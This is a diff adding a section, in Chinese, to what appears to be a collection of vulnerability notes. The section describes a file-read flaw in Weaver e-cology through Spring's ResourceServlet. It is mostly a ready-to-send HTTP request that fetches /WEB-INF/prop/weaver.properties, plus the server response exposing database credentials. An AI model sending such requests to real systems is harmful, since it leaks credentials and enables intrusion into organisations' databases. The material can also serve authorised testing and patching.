@@ -45,3 +45,45 @@
 	sos.close();
 %>
 ```
+
+## 文件读取漏洞 org.springframework.web.servlet.ResourceServlet
+
+https://docs.spring.io/spring/docs/3.0.x/javadoc-api/org/springframework/web/servlet/ResourceServlet.html
+
+泛微-数据库配置文件：`/WEB-INF/prop/weaver.properties`
+
+```
+GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
+Host: 127.0.0.1:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+```
+
+```
+HTTP/1.1 200 OK
+Server: Resin/3.1.8
+Cache-Control: private
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1
+Set-Cookie: ecology_JSessionId=xxxxxx; path=/
+Content-Length: 609
+Connection: close
+Date: Mon, 13 Jul 2020 08:13:13 GMT
+
+ecology.overtime=60
+DriverClasses = com.microsoft.jdbc.sqlserver.SQLServerDriver
+ecology.url=jdbc\:sqlserver\://127.0.0.1\:1433;DatabaseName\=ecology
+ecology.maxconn=300
+ecology.user=sa
+ecology.password=123456
+ecology.charset=ISO
+LOG_FORMAT=yyyy.MM.dd'-'hh\:mm\:ss
+ecology.isgoveproj=0
+DEBUG_MODE=false
+```
